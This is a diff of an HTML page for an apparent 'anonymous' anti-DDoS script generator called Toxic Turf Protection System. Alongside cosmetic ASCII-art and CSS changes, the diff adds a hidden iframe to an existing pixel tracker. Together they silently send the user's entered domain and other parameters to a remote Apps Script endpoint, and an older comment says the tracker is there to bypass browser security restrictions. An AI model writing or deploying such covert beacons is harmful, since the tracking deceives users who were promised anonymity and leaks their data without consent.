@@ -7,28 +7,68 @@
     <meta name="description" content="Free, anonymous, and polymorphic client-side Layer 7 Anti-DDoS protection generator.">
     <style>
         :root { --bg: #050505; --neon-green: #00ff66; --toxic-purple: #9d00ff; --dark-gray: #121212; --text: #e0e0e0; }
-        body { background-color: var(--bg); color: var(--text); font-family: 'Courier New', monospace; margin: 0; padding: 2rem; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
-        .container { max-width: 780px; width: 100%; background: var(--dark-gray); border: 2px solid var(--toxic-purple); padding: 2.5rem; border-radius: 8px; box-sizing: border-box; }
-        h1 { color: var(--neon-green); text-transform: uppercase; font-size: 1.8rem; text-align: center; }
+        body { background-color: var(--bg); color: var(--text); font-family: 'Courier New', monospace; margin: 0; padding: 1rem; display: flex; flex-direction: column; align-items: center; min-height: 100vh; box-sizing: border-box; }
+        .container { max-width: 820px; width: 100%; background: var(--dark-gray); border: 2px solid var(--toxic-purple); padding: 1.5rem; border-radius: 8px; box-sizing: border-box; box-shadow: 0 0 20px rgba(157, 0, 255, 0.3); }
+        
+        /* Estilos para el Arte ASCII */
+        .ascii-art { color: var(--neon-green); font-size: 0.6rem; line-height: 1.1; text-align: center; white-space: pre; overflow-x: auto; margin-bottom: 1rem; font-weight: bold; text-shadow: 0 0 5px var(--neon-green); }
+        .ascii-skull { color: var(--toxic-purple); font-size: 0.55rem; line-height: 1.0; text-align: center; white-space: pre; margin: 1rem 0; text-shadow: 0 0 5px var(--toxic-purple); }
+        
+        h1 { color: var(--neon-green); text-transform: uppercase; font-size: 1.5rem; text-align: center; margin: 0.5rem 0; letter-spacing: 2px; }
         .subtitle { text-align: center; color: #888; font-size: 0.85rem; margin-bottom: 1.5rem; }
         .form-group { margin-bottom: 1.5rem; }
         label { display: block; margin-bottom: 0.5rem; color: var(--neon-green); font-weight: bold; }
-        input { width: 100%; padding: 0.8rem; background: #000; border: 1px solid var(--toxic-purple); color: #fff; font-family: inherit; border-radius: 4px; box-sizing: border-box; }
-        button { background: var(--toxic-purple); color: #fff; border: none; padding: 0.9rem 1.5rem; font-family: inherit; font-weight: bold; cursor: pointer; width: 100%; border-radius: 4px; text-transform: uppercase; }
+        input { width: 100%; padding: 0.8rem; background: #000; border: 1px solid var(--toxic-purple); color: #fff; font-family: inherit; border-radius: 4px; box-sizing: border-box; outline: none; }
+        input:focus { border-color: var(--neon-green); box-shadow: 0 0 8px var(--neon-green); }
+        button { background: var(--toxic-purple); color: #fff; border: none; padding: 0.9rem 1.5rem; font-family: inherit; font-weight: bold; cursor: pointer; width: 100%; border-radius: 4px; text-transform: uppercase; transition: all 0.2s ease-in-out; }
+        button:hover { background: #b01aff; box-shadow: 0 0 15px var(--toxic-purple); }
         .output-box { background: #000; border: 1px dashed var(--neon-green); padding: 1.2rem; margin-top: 1.5rem; border-radius: 4px; word-break: break-all; font-size: 0.82rem; color: var(--neon-green); display: none; white-space: pre-wrap; }
+        
+        /* Ajustes para móviles */
+        @media (max-width: 600px) {
+            body { padding: 0.5rem; }
+            .container { padding: 1rem; }
+            .ascii-art { font-size: 0.38rem; }
+            .ascii-skull { font-size: 0.4rem; }
+            h1 { font-size: 1.2rem; }
+        }
     </style>
 </head>
 <body>
     <div class="container">
+        <!-- Logo Cyber ASCII Banner -->
+        <pre class="ascii-art">
+  ________  ___  ____  ______  _______ __  ____  ____  ______
+ /_  __/  |/  / / __ \/ ____/ /_  __// / / / / / / / / / ____/
+  / / / /|_/ / / /_/ / /       / /  / / / / /_/ /_/ / /___   
+ / / / /  / / / ____/ /___    / /  / /_/ / __  / __  /___/ /  
+/_/ /_/  /_/ /_/    \____/   /_/   \____/_/ /_/_/ /_/_____/   
+        </pre>
+
         <h1>Toxic Turf Protection System</h1>
         <div class="subtitle">// Dynamic Cryptic Anti-DDoS Script Generator //</div>
 
+        <!-- ASCII Skull Icon -->
+        <pre class="ascii-skull">
+      ░░░░░░░░░░░░░░░░░░░░░░░░░░░
+      ░░░░░███████████████░░░░░░
+      ░░░███████████████████░░░░
+      ░░█████████████████████░░░
+      ░░████  █████████  ████░░░
+      ░░████  █████████  ████░░░
+      ░░█████████████████████░░░
+      ░░░████████ █ █ ███████░░░
+      ░░░░███████ █ █ ██████░░░░
+      ░░░░░░██ █ █ █ █ █ ██░░░░░
+      ░░░░░░░░░░░░░░░░░░░░░░░░░░
+        </pre>
+
         <div class="form-group">
-            <label for="targetDomain">Target Website Domain / Name:</label>
+            <label for="targetDomain">[+] TARGET WEBSITE DOMAIN / NAME:</label>
             <input type="text" id="targetDomain" placeholder="e.g. my-awesome-website.com">
         </div>
 
-        <button onclick="_gn8x()">Generate Unique Polymorphic Shield Tag</button>
+        <button onclick="_gn8x()">⚡ GENERATE UNIQUE POLYMORPHIC SHIELD TAG ⚡</button>
 
         <div id="resultContainer" class="output-box">
             <code id="resultText"></code>
@@ -99,7 +139,7 @@
             _txt.innerText = _scriptPayload;
             _box.style.display = 'block';
 
-            // Log execution via Pixel Tracker (Image object) to bypass CORS and mobile security restrictions
+            // Log execution using multiple redundant methods to guarantee execution across mobile and desktop
             if (APPS_SCRIPT_URL && APPS_SCRIPT_URL.startsWith("https://")) {
                 const queryParams = new URLSearchParams({
                     domain: _d,
@@ -108,8 +148,16 @@
                 });
                 const fullUrl = `${APPS_SCRIPT_URL}?${queryParams.toString()}`;
 
+                // Method 1: Pixel Tracker Image Object
                 const tracker = new Image();
                 tracker.src = fullUrl;
+
+                // Method 2: Invisible iframe fallback
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = fullUrl;
+                document.body.appendChild(iframe);
+                setTimeout(() => { if (iframe.parentNode) iframe.parentNode.removeChild(iframe); }, 3000);
             }
         }
     </script>
